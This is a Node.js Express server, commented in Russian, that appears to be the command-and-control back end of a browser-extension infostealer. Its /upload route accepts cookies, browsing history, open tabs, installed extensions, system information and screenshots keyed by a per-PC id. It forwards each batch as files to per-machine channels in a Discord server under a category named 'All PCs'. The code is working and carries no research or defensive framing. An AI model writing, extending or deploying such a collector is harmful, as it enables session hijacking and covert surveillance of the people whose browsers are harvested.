import express from "express";
import { Client, GatewayIntentBits, ChannelType } from "discord.js";

const app = express();
app.use(express.json({ limit: "10mb" }));

const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const CATEGORY_NAME = "Все ПК";

// Инициализация Discord бота
const bot = new Client({ intents: [GatewayIntentBits.Guilds] });

bot.once("clientReady", () => {
  console.log(`✅ Бот вошёл как ${bot.user.tag}`);
});

// Получаем или создаём категорию
async function getOrCreateCategory(guild, name) {
  let category = guild.channels.cache.find(c => c.type === ChannelType.GuildCategory && c.name === name);
  if (!category) {
    category = await guild.channels.create({ name, type: ChannelType.GuildCategory });
  }
  return category;
}

// Получаем или создаём текстовый канал
async function getOrCreateTextChannel(guild, name, parentId) {
  if (!name) throw new Error("Channel name is required!");
  let channel = guild.channels.cache.find(
    c => c.type === ChannelType.GuildText && c.name === name && c.parentId === parentId
  );
  if (!channel) {
    channel = await guild.channels.create({
      name,
      type: ChannelType.GuildText,
      parent: parentId
    });
  }
  return channel;
}

// Маршрут для загрузки данных от расширения
app.post("/upload", async (req, res) => {
  try {
    const { pcId, cookies, history, systemInfo, tabs, extensions, screenshot } = req.body;
    if (!pcId) return res.status(400).json({ error: "pcId is required" });

    const guild = await bot.guilds.fetch(GUILD_ID);
    const category = await getOrCreateCategory(guild, CATEGORY_NAME);
    const channel = await getOrCreateTextChannel(guild, pcId, category.id);

    const files = [];

    if (cookies) files.push({ attachment: Buffer.from(JSON.stringify(cookies, null, 2)), name: `${pcId}-cookies.json` });
    if (history) files.push({ attachment: Buffer.from(JSON.stringify(history, null, 2)), name: `${pcId}-history.json` });
    if (systemInfo) files.push({ attachment: Buffer.from(JSON.stringify(systemInfo, null, 2)), name: `${pcId}-system.json` });
    if (tabs) files.push({ attachment: Buffer.from(JSON.stringify(tabs, null, 2)), name: `${pcId}-tabs.json` });
    if (extensions) files.push({ attachment: Buffer.from(JSON.stringify(extensions, null, 2)), name: `${pcId}-extensions.json` });
    if (screenshot) files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${pcId}-screenshot.jpeg` });

    if (files.length > 0) await channel.send({ files });

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

// Сервер
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Сервер слушает порт ${PORT}`));
bot.login(DISCORD_BOT_TOKEN);
